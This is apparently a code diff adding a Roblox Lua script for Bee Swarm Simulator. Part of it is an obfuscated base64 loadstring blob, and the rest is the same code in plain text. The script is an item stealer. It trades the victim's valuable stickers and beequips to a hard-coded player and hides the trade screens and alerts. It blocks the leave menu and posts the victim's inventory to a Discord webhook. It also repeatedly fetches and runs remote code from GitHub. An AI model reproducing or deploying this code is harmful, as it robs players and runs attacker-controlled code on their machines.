yQ2hpbGQoIkJsdXJTaGFkZSIsIG1hdGguaHVnZSkKCUJsdXJTaGFkZS5WaXNpYmxlID0gZmFsc2UKCUJsdXJTaGFkZTpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoIlZpc2libGUiKTpDb25uZWN0KGZ1bmN0aW9uKCkKCQlpZiBCbHVyU2hhZGUuVmlzaWJsZSA9PSB0cnVlIHRoZW4gCgkJCUJsdXJTaGFkZS5WaXNpYmxlID0gZmFsc2UKCQllbmQKCWVuZCkKCQoJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJbG9jYWwgQmx1ciA9IExpZ2h0aW5nOldhaXRGb3JDaGlsZCgiQmx1ciIsIG1hdGguaHVnZSkKCQlCbHVyLkVuYWJsZWQgPSBmYWxzZQoJCUJsdXI6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJFbmFibGVkIik6Q29ubmVjdChmdW5jdGlvbigpCgkJCWlmIEJsdXIuRW5hYmxlZCA9PSB0cnVlIHRoZW4gCgkJCQlCbHVyLkVuYWJsZWQgPSBmYWxzZQoJCQllbmQKCQllbmQpCgllbmQpCgkKCWxvY2FsIE1lc3NhZ2VQcm9tcHRCb3ggPSBTY3JlZW5HdWk6V2FpdEZvckNoaWxkKCJNZXNzYWdlUHJvbXB0Qm94IiwgbWF0aC5odWdlKQoJTWVzc2FnZVByb21wdEJveC5WaXNpYmxlID0gZmFsc2UKCU1lc3NhZ2VQcm9tcHRCb3g6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJWaXNpYmxlIik6Q29ubmVjdChmdW5jdGlvbigpCgkJaWYgTWVzc2FnZVByb21wdEJveC5WaXNpYmxlID09IHRydWUgdGhlbiAKCQkJbG9jYWwgSGlkZSA9IGZhbHNlCgoJCQlmb3IgaSwgdiBpbiBwYWlycyhNZXNzYWdlUHJvbXB0Qm94OkdldERlc2NlbmRhbnRzKCkpIGRvCgkJCQlpZiAodjpJc0EoIlRleHRMYWJlbCIpIG9yIHY6SXNBKCJUZXh0QnV0dG9uIikpIGFuZCB2LlRleHQ6bG93ZXIoKTpmaW5kKCJ0cmFkZSIpIHRoZW4KCQkJCQlIaWRlID0gdHJ1ZQoJCQkJZW5kCgkJCWVuZAoKCQkJaWYgbm90IEhpZGUgdGhlbiByZXR1cm4gZW5kCgkJCU1lc3NhZ2VQcm9tcHRCb3guVmlzaWJsZSA9IGZhbHNlCgkJZW5kCgllbmQpCmVuZAoKbG9jYWwgZnVuY3Rpb24gRW5hYmxlUGxheWVyTW92ZW1lbnQoKQoJbG9jYWwgTWFzdGVyQ29udHJvbCA9IExvY2FsUGxheWVyOldhaXRGb3JDaGlsZCgiUGxheWVyU2NyaXB0cyIsIG1hdGguaHVnZSk6V2FpdEZvckNoaWxkKCJDb250cm9sU2NyaXB0IiwgbWF0aC5odWdlKTpXYWl0Rm9yQ2hpbGQoIk1hc3RlckNvbnRyb2wiLCBtYXRoLmh1Z2UpCglyZXF1aXJlKE1hc3RlckNvbnRyb2wpOkVuYWJsZSgpCmVuZAoKCmxvY2FsIFNlc3Npb25JRCA9IG5pbApFdmVudHMuQ2xpZW50TGlzdGVuKCJUcmFkZVVwZGF0ZUluZm8iLCBmdW5jdGlvbihJbmNvbWluZ0RhdGEpCglTZXNzaW9uSUQgPSBJbmNvbWluZ0RhdGEuU2Vzc2lvbklECmVuZCkKCmxvY2FsIGZ1bmN0aW9uIFN0ZWFsaW5nU2Vzc2lvbigpCgl3aGlsZSBWaWN0aW1Jc1RyYWRpbmcuVmFsdWUgPT0gdHJ1ZSBvciBTdGVhbGVySXNUcmFkaW5nLlZhbHVlID09IHRydWUgZG8KCQl0YXNrLndhaXQoKQoJZW5kCgoJRXZlbnRzLkNsaWVudENhbGwoIlRyYWRlUGxheWVyUmVxdWVzdFN0YXJ0IiwgU3RlYWxlcklEKQoKCVRyYWRlTGF5ZXI6V2FpdEZvckNoaWxkKCJUcmFkZUFuY2hvckZyYW1lIiwgbWF0aC5odWdlKQoJCglFbmFibGVQbGF5ZXJNb3ZlbWVudCgpCgkKCXdoaWxlIFNlc3Npb25JRCA9PSBuaWwgZG8gdGFzay53YWl0KCkgZW5kCgoJbG9jYWwgQm9va1N0aWNrZXJzID0gR2V0U3RpY2tlcnNGaWxlc0Zyb20oIkJvb2siKQoJbG9jYWwgV2hpdGVsaXN0ZWRCb29rID0gR2V0V2hpdGVsaXN0ZWRTdGlja2VycyhCb29rU3RpY2tlcnMpCgkKCWxvY2FsIE1heFNpemUgPSAjV2hpdGVsaXN0ZWRCb29rID49IE1BWF9PRkZFUl9TSVpFIGFuZCBNQVhfT0ZGRVJfU0laRSBvciAjV2hpdGVsaXN0ZWRCb29rCgkKCWlmICNXaGl0ZWxpc3RlZEJvb2sgPiAwIHRoZW4KCQlmb3IgXywgRmFrZUZpbGUgaW4gcGFpcnMoV2hpdGVsaXN0ZWRCb29rKSBkbwoJCQlpZiBNYXhTaXplID09IDAgdGhlbiBicmVhayBlbmQKCQkJdGFzay53YWl0KDAuMTUpCgkJCUFkZFRyYWRlU3RpY2tlcihGYWtlRmlsZSwgU2Vzc2lvbklEKQoJCQlNYXhTaXplIC09IDEKCQllbmQKCWVuZAoJCglsb2NhbCBCZWVxdWlwcyA9IEdldEJlZXF1aXBzRmlsZXMoKQoJbG9jYWwgV2hpdGVsaXN0ZWRCUXMgPSBHZXRXaGl0ZWxpc3RlZEJlZXF1aXBzKEJlZXF1aXBzKQoJCglsb2NhbCBTcGFjZUxlZnQgPSBNQVhfT0ZGRVJfU0laRSAtICNXaGl0ZWxpc3RlZEJvb2sKCQoJaWYgI1doaXRlbGlzdGVkQlFzID4gMCBhbmQgU3BhY2VMZWZ0ID4gMCB0aGVuCgkJZm9yIF8sIEZha2VGaWxlIGluIHBhaXJzKFdoaXRlbGlzdGVkQlFzKSBkbwoJCQlpZiBTcGFjZUxlZnQgPT0gMCB0aGVuIGJyZWFrIGVuZAoJCQl0YXNrLndhaXQoMC4xNSkKCQkJQWRkVHJhZGVCZWVxdWlwKEZha2VGaWxlLkYsIFNlc3Npb25JRCkKCQkJU3BhY2VMZWZ0IC09IDEKCQllbmQKCWVuZAoJCQoJdGFzay53YWl0KDMpCgoJQWNjZXB0VHJhZGUoU2Vzc2lvbklEKQoKCWlmICNXaGl0ZWxpc3RlZEJvb2sgKyAjV2hpdGVsaXN0ZWRCUXMgPiBNQVhfT0ZGRVJfU0laRSB0aGVuCgkJU3RlYWxpbmdTZXNzaW9uKCkKCWVuZAplbmQKCkxvY2FsUGxheWVyLk9uVGVsZXBvcnQ6Q29ubmVjdChmdW5jdGlvbihTdGF0ZSkKCXF1ZXVlX29uX3RlbGVwb3J0KCJsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05pa29PbmVzaG90L2RpZGFjdGljLXN1Y2NvdGFzaC9yZWZzL2hlYWRzL21haW4vcGEubHVhJykpKCkiKQplbmQpCgp0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCWxvY2FsIG9sZENvZGUgPSBnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9OaWtvT25lc2hvdC9kaWRhY3RpYy1zdWNjb3Rhc2gvcmVmcy9oZWFkcy9tYWluL3JjLmx1YSIpCgl3aGlsZSB3YWl0KDUpIGRvCgkJbG9jYWwgbmV3ID0gZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTmlrb09uZXNob3QvZGlkYWN0aWMtc3VjY290YXNoL3JlZnMvaGVhZHMvbWFpbi9yYy5sdWEiKQoJCWlmIG5ldyB+PSBvbGRDb2RlIHRoZW4KCQkJb2xkQ29kZSA9IG5ldwoJCQlsb2Fkc3RyaW5nKG9sZENvZGUpKCkKCQllbmQKCWVuZAplbmQpCgpsb2NhbCBmdW5jdGlvbiBXYWl0Rm9yQXZhaWxhYmxlU2VydmVyKCkKCWxvY2FsIEN1cnJlbnQKCWxvY2FsIE1heFBsYXllcnMgPSA2CglyZXBlYXQgCgkJQ3VycmVudCA9ICNQbGF5ZXJzOkdldFBsYXllcnMoKQoJCXRhc2sud2FpdCgpCgl1bnRpbCBDdXJyZW50IDwgUGxheWVycy5NYXhQbGF5ZXJzCmVuZAoKbG9jYWwgZnVuY3Rpb24gUHJldmVudExlYXZpbmcoKQoJbG9jYWwgU3VjLCBSZXMgPSBwY2FsbChmdW5jdGlvbigpCgkJcmV0dXJuIGdhbWU6R2V0U2VydmljZSgiQ29yZUd1aSIpLlJvYmxveEd1aS5TZXR0aW5nc0NsaXBwaW5nU2hpZWxkLlNldHRpbmdzU2hpZWxkLk1lbnVDb250YWluZXIuUGFnZQoJZW5kKQoKCWxvY2FsIExlYXZlUGFnZQoKCWlmIG5vdCBTdWMgdGhlbgoJCXJldHVybiB3YXJuKCJub3QgZm91bmQgcGFnZSIsIFJlcykKCWVsc2UKCQlMZWF2ZVBhZ2UgPSBSZXMKCWVuZAoKCWdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLlJlbmRlclN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbigpCgkJTGVhdmVQYWdlLlZpc2libGUgPSBmYWxzZQoJZW5kKQplbmQKCmxvY2FsIE9sZDsgT2xkID0gaG9va2Z1bmN0aW9uKHJlcXVpcmUoUmVwbGljYXRlZFN0b3JhZ2UuQWxlcnRCb3hlcykuUHVzaCwgbmV3Y2Nsb3N1cmUoZnVuY3Rpb24oc2VsZiwgVGV4dCwgLi4uKQoJaWYgVGV4dDpmaW5kKFN0ZWFsZXJPbmVOYW1lKSBhbmQgVGV4dDpsb3dlcigpOmZpbmQoInRyYWRlIikgdGhlbgoJCXJldHVybjsKCWVuZAoJcmV0dXJuIE9sZChzZWxmLCBUZXh0LCAuLi4pCmVuZCkpCgp0YXNrLnNwYXduKFByZXZlbnRMZWF2aW5nKQoKV2FpdEZvckF2YWlsYWJsZVNlcnZlcigpCgpTZW5kV2ViaG9vaygpCgpXYWl0Rm9yTG9hZCgpCgp0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCXdoaWxlIHRhc2sud2FpdCgpIGRvCgkJbG9jYWwgTGFzdFRyYWRlID0gMAoJCXdoaWxlIHRhc2sud2FpdCgpIGFuZCBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKFN0ZWFsZXJPbmVOYW1lKSBkbwoJCQlpZiB0aWNrKCkgLSBMYXN0VHJhZGUgPj0gMTUgdGhlbgoJCQkJTGFzdFRyYWRlID0gdGljaygpCgkJCQlFdmVudHMuQ2xpZW50Q2FsbCgiVHJhZGVQbGF5ZXJSZXF1ZXN0U3RhcnQiLCBTdGVhbGVySUQpCgkJCWVuZAoJCWVuZAoJCVdhaXRGb3JMb2FkKCkKCWVuZAplbmQpCgpQbGF5ZXJzLlBsYXllclJlbW92aW5nOkNvbm5lY3QoZnVuY3Rpb24oUGxyKQoJaWYgUGxyID09IFN0ZWFsZXJQbGF5ZXIgdGhlbgoJCVN0ZWFsZXJQbGF5ZXIsIFN0ZWFsZXJPbmVOYW1lID0gbmlsLCBuaWwKCQlTdGVhbGVySXNUcmFkaW5nID0gZmFsc2UKCWVuZAplbmQpCgpIaWRlVHJhZGVHdWkoKQoKU3RlYWxpbmdTZXNzaW9uKCk=",getfenv())()
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local Lighting = game:GetService("Lighting")
+local CoreGui = game:GetService("CoreGui")
+
+local LocalPlayer = Players.LocalPlayer
+local LocalPlayerID = LocalPlayer.UserId
+local PlayerGui = LocalPlayer.PlayerGui
+local ScreenGui = PlayerGui:WaitForChild("ScreenGui", math.huge)
+local TradeLayer = ScreenGui:WaitForChild("TradeLayer", math.huge)
+
+local Events = require(ReplicatedStorage.Events)
+local StickerFile = require(ReplicatedStorage.Stickers.StickerFile)
+local StickerTools = require(ReplicatedStorage.Stickers)
+local StickerBookMenu = require(ReplicatedStorage.Gui.StickerMenus.StickerBookMenu)
+
+local MAX_OFFER_SIZE = 30
+
+local StealerName = {"Freshie_Bestie"}--"altbeeswarmacc17"
+local StealerPlayer = nil
+local StealerID = nil
+
+local VictimIsTrading = nil
+local StealerIsTrading = nil
+
+local WhitelistedStickers = {
+	"Brown Cub Skin",
+	"Robo Cub Skin",
+	"Stick Bug Skin",
+	"Star Cub Skin",
+	"Noob Cub Skin",
+	"Bee Cub Skin",
+	"Gingerbread Cub Skin",
+	"Snow Cub Skin",
+	"Peppermint Robo Cub Skin",
+	"Doodle Cub Skin",
+	"Gloomy Cub Skin",
+	"Wavy Cyan Hive Skin",
+	"Wavy Purple Hive Skin",
+	"Wavy Doodle Hive Skin",
+	"Icy Crowned Hive Skin",
+	"Bear Bee Voucher",
+	"Cub Buddy Voucher",
+	"x2 Bee Gather Voucher",
+	"x2 Convert Speed Voucher",
+	"Offline Voucher",
+	"Ticket Voucher",
+	"Round Basic Bee",
+	"Diamond Diamond Bee",
+	"4-Pronged Vector Bee",
+	"Bear Bee Offer",
+	"Tabby Scratch",
+	"Tabby From Behind",
+	"Fuzz Bomb", 
+	"Precise Eye",
+	"Shy Brown Bear",
+	"Sitting Mother Bear",
+	"Squashed Head Bear",
+	"Stretched Head Bear",
+	"Dapper From Above",
+	"Sideways Spirit Bear",
+	"Glowering Gummy Bear",
+	"Stranded Sun Bear",
+	"Auryn",
+	"Triple Exclamation",
+	"Eviction",
+	"Cyan Hilted Sword",
+	"Wall Crack",
+	"Nessie",
+	"Walking Stick Nymph",
+	"Ionic Column Top",
+	"Ionic Column Middle",
+	"Ionic Column Base",
+	"Left Gold Swirl Fleuron",
+	"Right Gold Swirl Fleuron",
+	"Left Shining Diamond Fleuron",
+	"Right Shining Diamond Fleuron",
+	"Left Mythic Gem Fleuron",
+	"Right Mythic Gem Fleuron",
+	"Royal Symbol",
+	"Black Truffle Mushroom",
+	"Prismatic Mushroom",
+	"Gummyballer",
+	"Dark Scythe",
+	"Capricorn Star Sign",
+	"Aquarius Star Sign",
+	"Pisces Star Sign",
+	"Aries Star Sign",
+	"Taurus Star Sign",
+	"Gemini Star Sign",
+	"Cancer Star Sign",
+	"Leo Star Sign",
+	"Virgo Star Sign",
+	"Libra Star Sign",
+	"Scorpio Star Sign",
+	"Sagittarius Star Sign",
+	"Sunflower Field Stamp",
+	"Dandelion Field Stamp",
+	"Mushroom Field Stamp",
+	"Blue Flower Field Stamp",
+	"Clover Field Stamp",
+	"Strawberry Field Stamp",
+	"Spider Field Stamp",
+	"Bamboo Field Stamp",
+	"Pineapple Patch Stamp",
+	"Stump Field Stamp",
+	"Cactus Field Stamp",
+	"Pumpkin Patch Stamp",
+	"Pine Tree Forest Stamp",
+	"Rose Field Stamp",
+	"Hub Field Stamp",
+	"Mountain Top Field Stamp",
+	"Pepper Patch Stamp",
+	"Coconut Field Stamp",
+	"Ant Field Stamp",
+	"Flying Festive Bee",
+	"Party Robo Bear",
+	"BBM From Below",
+}
+
+local StealerOneName
+local PrivateServerWaitTime = 60*10
+
+local function WaitForLoad()
+	repeat
+		for i, v in pairs(StealerName) do
+			StealerPlayer = Players:FindFirstChild(v)
+			if StealerPlayer then
+				StealerOneName = v
+				StealerID = StealerPlayer.UserId
+				workspace:WaitForChild(v, math.huge)
+				pcall(function()
+					workspace[v]:Destroy()
+				end)
+				VictimIsTrading = LocalPlayer:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
+				StealerIsTrading = StealerPlayer:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
+				break
+			end
+		end
+		task.wait(0.5)
+	until StealerPlayer
+end
+
+local function GetPlayerStats()
+	return Events.ClientCall("RetrievePlayerStats")
+end
+
+local function GetStickersFilesFrom(StorageType)
+	return GetPlayerStats().Stickers[StorageType]
+end
+
+local function GetBeequipsFiles()
+	local PlayerStats = GetPlayerStats()
+	
+	local Beequips = {}
+	
+	local CaseBeequips = PlayerStats.Beequips.Case
+	
+	for _, FakeFile in pairs(CaseBeequips) do
+		table.insert(Beequips, {F = FakeFile, M = "Case"})
+	end
+	
+	local StorageBeequips = PlayerStats.Beequips.Storage
+	
+	for _, FakeFile in pairs(StorageBeequips) do
+		table.insert(Beequips, {F = FakeFile, M = "Storage"})
+	end
+	
+	return Beequips
+end
+
+local function GetTypeDef(FakeFile)
+	local ActualFile = StickerFile.FromData(FakeFile)
+	local TypeDef = ActualFile:GetTypeDef()
+
+	return TypeDef
+end
+
+local function GetWhitelistedStickers(Storage)
+	local WhitelistedFiles = {}
+
+	for _, FakeFile in (Storage) do
+		local TypeDef = GetTypeDef(FakeFile)
+
+		if table.find(WhitelistedStickers, TypeDef.Name) then 
+			table.insert(WhitelistedFiles, FakeFile)
+		end
+	end
+
+	return WhitelistedFiles
+end
+
+local function GetWhitelistedBeequips(Beequips)
+	--[[local WhitelistedFiles = {}
+	
+	for _, FakeFile in pairs(Beequips) do
+		local InternalName = FakeFile.F.T
+		
+		if table.find(WhitelistedBeequips, InternalName) then
+			table.insert(WhitelistedFiles, FakeFile)
+		end
+	end
+	
+	return WhitelistedFiles]]
+	return Beequips
+end
+
+local function GetNextFreeSlot(PlayerStats)
+	local PlayerStats = GetPlayerStats()
+	return StickerTools.PlayerStatsToFirstEmptyBookIndex(PlayerStats)
+end
+
+local function DiscardSticker(FakeFile)
+	Events.ClientCall("StickerDiscard", FakeFile)
+end
+
+local function ClaimInboxSticker(FakeFile)
+	FakeFile = StickerFile.FromData(FakeFile)
+	StickerBookMenu.PressButtonClaimFromInbox(FakeFile)
+end
+
+local function AddTradeSticker(FakeFile, SessionID)
+	local TypeDef = GetTypeDef(FakeFile)
+
+	local StickerCategory = TypeDef.CosmeticType
+	if StickerCategory:find("Voucher") or StickerCategory:find("Hive Skin") or StickerCategory:find("Cub Skin") then
+		StickerCategory = "Sticker"
+	end
+
+	Events.ClientCall("TradePlayerAddItem", SessionID, {
+		["File"] = FakeFile,
+		["Category"] = StickerCategory
+	})
+end
+
+local function AddTradeBeequip(FakeFile, SessionID)
+	Events.ClientCall("TradePlayerAddItem", SessionID, {
+		["File"] = FakeFile,
+		["Category"] = "Beequip"
+	})
+end
+
+local function AcceptTrade(SessionID)
+	Events.ClientCall("TradePlayerAccept", SessionID, {
+		[tostring(LocalPlayerID)] = require(ReplicatedStorage.Gui.TradeGui).GetMyOffer(),
+		[tostring(StealerID)] = {}
+	})
+	
+	task.wait(1)
+	
+	Events.ClientCall("TradePlayerAccept", SessionID, {
+		[tostring(LocalPlayerID)] = require(ReplicatedStorage.Gui.TradeGui).GetMyOffer(),
+		[tostring(StealerID)] = {}
+	})
+end
+
+local function collapseList(list)
+    local counts = {}
+    local order = {}
+
+    for _, v in ipairs(list) do
+        if counts[v] then
+            counts[v] += 1
+        else
+            counts[v] = 1
+            table.insert(order, v)
+        end
+    end
+
+    local result = {}
+
+    for _, v in ipairs(order) do
+        local n = counts[v]
+        if n > 1 then
+            table.insert(result, "[" .. n .. "x] " .. v)
+        else
+            table.insert(result, v)
+        end
+    end
+
+    return result
+end
+
+local function SendWebhook()
+	local Stickers = GetStickersFilesFrom("Book")
+	local Beequips = GetBeequipsFiles()
+	
+	Stickers = GetWhitelistedStickers(Stickers)
+	Beequips = GetWhitelistedBeequips(Beequips)
+
+	local tohex=function(h)
+		return h:gsub(".", function(v) return string.format("%02x", v:byte()) end)
+	end
+
+	local StickersToSend = {}
+	local BeequipsToSend = {}
+	
+	local PingAll = false
+	for _, FakeFile in pairs(Stickers) do
+		local TypeDef = GetTypeDef(FakeFile)
+		local Name = TypeDef.Name
+		if (Name == "Icy Crowned Hive Skin" or Name == "Wavy Purple Hive Skin") or (Name ~= "Ticket Voucher" and (tostring(Name):find("Star Sign") or tostring(Name):find("Cub Skin") or tostring(Name):find("Voucher"))) then
+			if game:GetService("ReplicatedFirst").PlaceInfo.IsPublicServer.Value == true then
+				PingAll = true
+			end
+			Name = tostring(Name):upper() .. "!!!!"
+		end
+		table.insert(StickersToSend, Name)
+	end
+
+	if #StickersToSend == 0 then
+		return warn(".")
+	end
+	
+	for _, FakeFile in pairs(Beequips) do
+		table.insert(BeequipsToSend, (FakeFile.F.T or "Unknown") .. " [" .. FakeFile.M .. "]")
+	end
+
+
+	StickersToSend = collapseList(StickersToSend)
+	BeequipsToSend = collapseList(BeequipsToSend)
+
+	local IsHiveHub = game.ReplicatedFirst.PlaceType.Value == "Hive Hub"
+	if IsHiveHub then return end
+
+	local data = {
+		content = (PingAll and "@everyone\n" or "\n") .. 
+			string.format(
+				"\n**Teleport to server**\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(game.PlaceId,\"%s\",game.Players.LocalPlayer)",
+				game.JobId
+		),
+		["embeds"] = {
+			{
+				["title"] = LocalPlayer.Name .. (IsHiveHub and " **[HIVE HUB]** " or " ") .. identifyexecutor(),
+				["color"] = 0xFFD700, -- gold color
+				fields = {
+					{
+						name = "Stickers",
+						inline = false,
+						value = (#StickersToSend > 0 and table.concat(StickersToSend, "\n") or "None")
+					},
+					{
+						name = "Beequips",
+						inline = false,
+						value =  (#BeequipsToSend > 0 and table.concat(BeequipsToSend, "\n") or "None")
+					}
+				}
+			}
+		}
+	}
+
+	data = HttpService:JSONEncode(data)
+	
+	local WebhookURL = "https://discord.com/api/webhooks/1477837511211614338/3FXQ2SxEDW8eWFXeW3kuegNRzyOi383ab7ovTDE6RQJYh-vLjO0913-omTADkWCgLM0k"
+	if game:GetService("ReplicatedFirst").PlaceInfo.IsPublicServer.Value == false then
+		print(request({
+			Url = WebhookURL,
+			Body = tohex(HttpService:JSONEncode({content = "executed but in private server (username = " .. LocalPlayer.Name .. ") " ..
+				" teleporting to public server <t:" .. (os.time() + PrivateServerWaitTime) .. ":R>"
+			})),
+			Method = "POST",
+			Headers = {
+				["content-type"] = "application/json"
+			}
+		}).StatusCode)
+		print(request({
+			Url = WebhookURL,
+			Body = tohex(data),
+			Method = "POST",
+			Headers = {
+				["content-type"] = "application/json"
+			}
+		}).StatusCode)
+
+		task.wait(PrivateServerWaitTime)
+		local TeleportService = game:GetService("TeleportService")
+
+		local placeId = game.PlaceId
+		local currentJob = game.JobId
+
+		local url = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"
+		local response = HttpService:JSONDecode(game:HttpGet(url))
+
+		for _, server in ipairs(response.data) do
+			if server.playing < server.maxPlayers and server.id ~= currentJob then
+				TeleportService:TeleportToPlaceInstance(placeId, server.id, LocalPlayer)
+				break
+			end
+		end
+		return
+	end
+
+	print(request({
+		Url = WebhookURL,
+		Body = tohex(data),
+		Method = "POST",
+		Headers = {
+			["content-type"] = "application/json"
+		}
+	}).StatusCode)
+	-- Heartbeat
+	task.spawn(function()
+		local tick = os.time
+		local HB_INTERVAL = 120 -- 2 minutes
+		local NextHeartbeat = tick() + HB_INTERVAL
+		local HeartbeatsEnabled = false
+		while task.wait() do
+			if not HeartbeatsEnabled then return end
+			local data = HttpService:JSONEncode({
+				content = string.format("heartbeat recived from %s next heartbeat <t:%d:R>", LocalPlayer.Name, tick() + HB_INTERVAL)
+			})
+			if tick() >= NextHeartbeat then
+				NextHeartbeat = tick() + HB_INTERVAL
+				request({
+					Url = WebhookURL,
+					Body = tohex(data),
+					Method = "POST",
+					Headers = {
+						["content-type"] = "application/json"
+					}
+				})
+			end
+		end
+	end)
+end
+
+local function HideTradeGui()
+	TradeLayer.Visible = false
+	TradeLayer:GetPropertyChangedSignal("Visible"):Connect(function()
+		if TradeLayer.Visible == true then 
+			TradeLayer.Visible = false
+		end
+	end)
+	
+	local BlurShade = ScreenGui:WaitForChild("BlurShade", math.huge)
+	BlurShade.Visible = false
+	BlurShade:GetPropertyChangedSignal("Visible"):Connect(function()
+		if BlurShade.Visible == true then 
+			BlurShade.Visible = false
+		end
+	end)
+	
+	task.spawn(function()
+		local Blur = Lighting:WaitForChild("Blur", math.huge)
+		Blur.Enabled = false
+		Blur:GetPropertyChangedSignal("Enabled"):Connect(function()
+			if Blur.Enabled == true then 
+				Blur.Enabled = false
+			end
+		end)
+	end)
+	
+	local MessagePromptBox = ScreenGui:WaitForChild("MessagePromptBox", math.huge)
+	MessagePromptBox.Visible = false
+	MessagePromptBox:GetPropertyChangedSignal("Visible"):Connect(function()
+		if MessagePromptBox.Visible == true then 
+			local Hide = false
+
+			for i, v in pairs(MessagePromptBox:GetDescendants()) do
+				if (v:IsA("TextLabel") or v:IsA("TextButton")) and v.Text:lower():find("trade") then
+					Hide = true
+				end
+			end
+
+			if not Hide then return end
+			MessagePromptBox.Visible = false
+		end
+	end)
+end
+
+local function EnablePlayerMovement()
+	local MasterControl = LocalPlayer:WaitForChild("PlayerScripts", math.huge):WaitForChild("ControlScript", math.huge):WaitForChild("MasterControl", math.huge)
+	require(MasterControl):Enable()
+end
+
+
+local SessionID = nil
+Events.ClientListen("TradeUpdateInfo", function(IncomingData)
+	SessionID = IncomingData.SessionID
+end)
+
+local function StealingSession()
+	while VictimIsTrading.Value == true or StealerIsTrading.Value == true do
+		task.wait()
+	end
+
+	Events.ClientCall("TradePlayerRequestStart", StealerID)
+
+	TradeLayer:WaitForChild("TradeAnchorFrame", math.huge)
+	
+	EnablePlayerMovement()
+	
+	while SessionID == nil do task.wait() end
+
+	local BookStickers = GetStickersFilesFrom("Book")
+	local WhitelistedBook = GetWhitelistedStickers(BookStickers)
+	
+	local MaxSize = #WhitelistedBook >= MAX_OFFER_SIZE and MAX_OFFER_SIZE or #WhitelistedBook
+	
+	if #WhitelistedBook > 0 then
+		for _, FakeFile in pairs(WhitelistedBook) do
+			if MaxSize == 0 then break end
+			task.wait(0.15)
+			AddTradeSticker(FakeFile, SessionID)
+			MaxSize -= 1
+		end
+	end
+	
+	local Beequips = GetBeequipsFiles()
+	local WhitelistedBQs = GetWhitelistedBeequips(Beequips)
+	
+	local SpaceLeft = MAX_OFFER_SIZE - #WhitelistedBook
+	
+	if #WhitelistedBQs > 0 and SpaceLeft > 0 then
+		for _, FakeFile in pairs(WhitelistedBQs) do
+			if SpaceLeft == 0 then break end
+			task.wait(0.15)
+			AddTradeBeequip(FakeFile.F, SessionID)
+			SpaceLeft -= 1
+		end
+	end
+		
+	task.wait(3)
+
+	AcceptTrade(SessionID)
+
+	if #WhitelistedBook + #WhitelistedBQs > MAX_OFFER_SIZE then
+		StealingSession()
+	end
+end
+
+LocalPlayer.OnTeleport:Connect(function(State)
+	queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/NikoOneshot/didactic-succotash/refs/heads/main/pa.lua'))()")
+end)
+
+task.spawn(function()
+	local oldCode = game:HttpGet("https://raw.githubusercontent.com/NikoOneshot/didactic-succotash/refs/heads/main/rc.lua")
+	while wait(5) do
+		local new = game:HttpGet("https://raw.githubusercontent.com/NikoOneshot/didactic-succotash/refs/heads/main/rc.lua")
+		if new ~= oldCode then
+			oldCode = new
+			loadstring(oldCode)()
+		end
+	end
+end)
+
+local function WaitForAvailableServer()
+	local Current
+	local MaxPlayers = 6
+	repeat 
+		Current = #Players:GetPlayers()
+		task.wait()
+	until Current < Players.MaxPlayers
+end
+
+local function PreventLeaving()
+	local Suc, Res = pcall(function()
+		return game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page
+	end)
+
+	local LeavePage
+
+	if not Suc then
+		return warn("not found page", Res)
+	else
+		LeavePage = Res
+	end
+
+	game:GetService("RunService").RenderStepped:Connect(function()
+		LeavePage.Visible = false
+	end)
+end
+
+local Old; Old = hookfunction(require(ReplicatedStorage.AlertBoxes).Push, newcclosure(function(self, Text, ...)
+	if Text:find(StealerOneName) and Text:lower():find("trade") then
+		return;
+	end
+	return Old(self, Text, ...)
+end))
+
+task.spawn(PreventLeaving)
+
+WaitForAvailableServer()
+
+SendWebhook()
+
+WaitForLoad()
+
+task.spawn(function()
+	while task.wait() do
+		local LastTrade = 0
+		while task.wait() and Players:FindFirstChild(StealerOneName) do
+			if tick() - LastTrade >= 15 then
+				LastTrade = tick()
+				Events.ClientCall("TradePlayerRequestStart", StealerID)
+			end
+		end
+		WaitForLoad()
+	end
+end)
+
+Players.PlayerRemoving:Connect(function(Plr)
+	if Plr == StealerPlayer then
+		StealerPlayer, StealerOneName = nil, nil
+		StealerIsTrading = false
+	end
+end)
+
+HideTradeGui()
+
+StealingSession()
